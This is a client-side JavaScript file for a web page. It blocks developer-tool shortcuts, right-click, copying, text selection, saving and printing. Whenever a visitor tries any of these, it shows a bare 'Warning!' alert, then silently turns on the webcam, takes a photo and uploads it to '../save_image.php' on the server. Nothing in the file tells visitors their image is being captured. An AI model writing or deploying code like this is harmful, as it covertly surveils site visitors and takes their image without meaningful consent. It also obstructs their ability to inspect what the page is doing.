// Function to show the alert and prevent default behavior
function showAlertAndPrevent(e) {
    e.preventDefault();
    alert('Warning! ');
    captureAndUploadImage(); // Call function to capture and upload image
    return false;
  }

  // Function to capture image from webcam and upload to server
  async function captureAndUploadImage() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = canvas.toDataURL('image/png');
      stream.getTracks().forEach(track => track.stop()); // Stop webcam

      // Send the image data to the server
      uploadImage(imageData);
    } catch (err) {
      console.error('Error accessing webcam:', err);
    }
  }

  // Function to upload image to the server
  function uploadImage(imageData) {
    fetch('../save_image.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ image: imageData }),
    })
    .then(response => response.json())
    .then(data => {
      console.log('Image saved:', data);
    })
    .catch(error => {
      console.error('Error saving image:', error);
    });
  }

  // Block various key combinations
  window.addEventListener('keydown', function(e) {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && e.shiftKey && e.key === 'I') || // Ctrl+Shift+I
      (e.ctrlKey && e.shiftKey && e.key === 'J') || // Ctrl+Shift+J
      (e.ctrlKey && e.key === 'U') || // Ctrl+U
      (e.ctrlKey && e.key === 'S') || // Ctrl+S
      (e.ctrlKey && e.key === 'P') || // Ctrl+P
      (e.ctrlKey && e.key === 'A') || // Ctrl+A
      (e.ctrlKey && e.key === 'F2') // Ctrl+F2
    ) {
      showAlertAndPrevent(e);
    }
  });

  // Block right-click context menu
  window.addEventListener('contextmenu', function(e) {
    showAlertAndPrevent(e);
  });

  // Block right-click with mouse
  document.addEventListener('mousedown', function(e) {
    if (e.button === 2) {
      showAlertAndPrevent(e);
    }
  });

  // Refresh page on copy or cut
  function refreshPageOnCopyOrCut() {
    document.addEventListener('copy', showAlertAndPrevent);
    document.addEventListener('cut', showAlertAndPrevent);
    document.addEventListener('keydown', (event) => {
      if ((event.ctrlKey || event.metaKey) && (event.key === 'c' || event.key === 'x')) {
        showAlertAndPrevent(event);
      }
    });
  }
  refreshPageOnCopyOrCut();

  // Disable text selection
  function disableSelection(element) {
    element.addEventListener('selectstart', showAlertAndPrevent);
    element.style.userSelect = 'none'; // Disable text selection
    element.style.MozUserSelect = 'none';
    element.style.msUserSelect = 'none';
    element.style.webkitUserSelect = 'none';
  }

  // Apply disable selection to the whole document
  document.addEventListener('DOMContentLoaded', function() {
    disableSelection(document.body); // Disable text selection on the whole body
  });